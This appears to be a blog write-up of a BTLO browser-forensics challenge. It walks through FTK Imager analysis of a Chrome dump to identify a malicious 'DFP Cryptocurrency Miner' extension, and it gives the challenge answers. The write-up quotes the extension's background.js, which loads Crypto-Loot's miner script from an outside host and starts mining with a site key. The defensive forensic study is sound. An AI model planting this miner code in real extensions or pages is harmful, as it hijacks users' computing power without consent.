---
title: Browser Forensics - Cryptominer
date: 2023-05-26
image: 
   path: https://cdn.pixabay.com/photo/2020/10/22/01/46/cryptocurrency-5674685_1280.png
categories: [Write-Ups, BTLO, Challenges]
tags: [BTLO, DFIR, cryptominer]
---

## Scenario
Our SOC alerted that there is some traffic related to crypto mining from a PC that was just joined to the network. The incident response team acted immediately, observed that the traffic is originating from browser applications. After collecting all key browser data using FTK Imager, it is your job to use the ad1 file to investigate the crypto mining activity.

## Introduction
First of all, I downloaded "Browser Dump" file and copied it to a Windows VM where it was installed FTK Imager. 

- Here you can download FTK --> [FTK Imager download](https://www.exterro.com/ftk-imager){:target="_blank"}

Inside "Browser Dump" there are two files:
- **browserdata.ad1**
- **browserdata.ad1.txt**

You have to load **browserdata.ad1** on FTK Imager. I suggest to learn how to FTK Imager works before make the challenge.

When we talk about browser artifacts we talk about, navigation history, bookmarks, list of downloaded files, cache data…etc.
These artifacts are files stored inside of specific folders in the operating system. Each browser stores its files in a different place than other browsers and they all have different names.

## Challenge Submission

### How many browser-profiles are present in Google Chrome?

Profile Path usually is inside **C:\\Documents and Settings\\”USER NAME”\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default** and there is another folder with the same structure: **Profile 1**

>2 

### What is the name of the browser theme installed on Google Chrome?

Path where Chrome Extensions are installed:
```text
C:\Documents and Settings\”USER NAME”\Local Settings\Application Data\Google\Chrome\User Data\Default\Extensions
```

In the following path I discovered Theme's name: *C:\\Documents and Settings\\”USER NAME”\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default\\Extensions\\iiihlpikmpijdopbaegjibndhpgjmjfe\\1.6_0*

```JSON
{
   "app": {
      "launch": {
         "web_url": "http://atavi.com/browser-themes/?from=chrome-themes&tid=earth_in_space"
      },
      "urls": [ "http://atavi.com/browser-themes/" ]
   },
```

>Earth in Space

### Identify the Extension ID and Extension Name of the cryptominer

Continuing to look inside "Extensions", I discovered the following content inside a *manifest.json* file:

```json
{
   "background": {
      "scripts": [ "background.js" ]
   },
   "description": "Allows staff members to mine cryptocurrency in the background of their web browser",
   "icons": {
      "16": "16.png"
   },
   "key": "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAp1BrfOdr9hldFysTWVfr6nkuAD8IShanyW+d1kG1J6RKUWOCMQTjNUv2R+K+wz5pvgnrHZfc5jx+rGN1VPgs3VQnYCcFjbe2NXLbLLKkXPATIOLrmMjq7pQAEXu5xuqnRU4AkHumpEX81UD0Vv1TgAi5k1mZLrg5F2B02yXz1tfmMIiqCc/mG7K0/ECNUHXjzi/0B5Ubx3DCZvVSN32H+QvF7lxBnOpgjK9syeHPj4iXiyV9lgiCQjMGe4lKsVJfFT5nAf8tY2BBmna1MtY4LLwV1dIvJ922oFGEs0ty6391RwmC6S0j0oIOdGgQjylZKDREzVw959g/3PGp0lj9BQIDAQAB",
   "manifest_version": 2,
   "minimum_chrome_version": "9",
   "name": "DFP Cryptocurrency Miner",
   "omnibox": {
      "keyword": "DFP Miner"
   },
   "update_url": "https://clients2.google.com/service/update2/crx",
   "version": "3"
}

```

Referring to *description* and *name* we can understand that this is the cryptominer.

> egnfmleidkolminhjlkaomjefheafbbb, DFP Cryptocurrency Miner

### What is the description text of this extension?

> Allows staff members to mine cryptocurrency in the background of their web browser

### What is the name of the specific javascript web miner used in the browser extension?

Opening **background.js** I found the answer.

```js
<script src="https://crypto-loot.com/lib/miner.min.js"></script>
<script>
var miner=new CryptoLoot.Anonymous('b23efb4650150d5bc5b2de6f05267272cada06d985a0',
        {
        threads:3,autoThreads:false,throttle:0.2,
        }
);
miner.start();
</script>
<script>
	// Listen on events
	miner.on('found', function() { /* Hash found */ })
	miner.on('accepted', function() { /* Hash accepted by the pool */ })

	// Update stats once per second
	setInterval(function() {
		var hashesPerSecond = miner.getHashesPerSecond(20);
		var totalHashes = miner.getTotalHashes(256000000);
		var acceptedHashes = miner.getAcceptedHashes();

		// Output to HTML elements...
	}, 1000);
</script>
```

> crypto loot

### How many hashes is the crypto miner calculating per second?

```js
// Update stats once per second
	setInterval(function() {
		var hashesPerSecond = miner.getHashesPerSecond(20);
		var totalHashes = miner.getTotalHashes(256000000);
		var acceptedHashes = miner.getAcceptedHashes();

		// Output to HTML elements...
	}, 1000);
```

>20

### What is the public key associated with this mining activity?

```js
var miner=new CryptoLoot.Anonymous('b23efb4650150d5bc5b2de6f05267272cada06d985a0')
```

### What is the URL of the official Twitter page of the javascript web miner?

Just a Google search.

>twitter.com/CryptoLootMiner


*References*:
- [https://nasbench.medium.com/web-browsers-forensics-7e99940c579a](https://nasbench.medium.com/web-browsers-forensics-7e99940c579a){:target="_blank"}
- [https://focusinfotech.com/blog/browser-forensics](https://focusinfotech.com/blog/browser-forensics){:target="_blank"}
- [https://infosecwriteups.com/browser-forsensics-cyptominer-49e5beeb4433](https://infosecwriteups.com/browser-forsensics-cyptominer-49e5beeb4433){:target="_blank"}
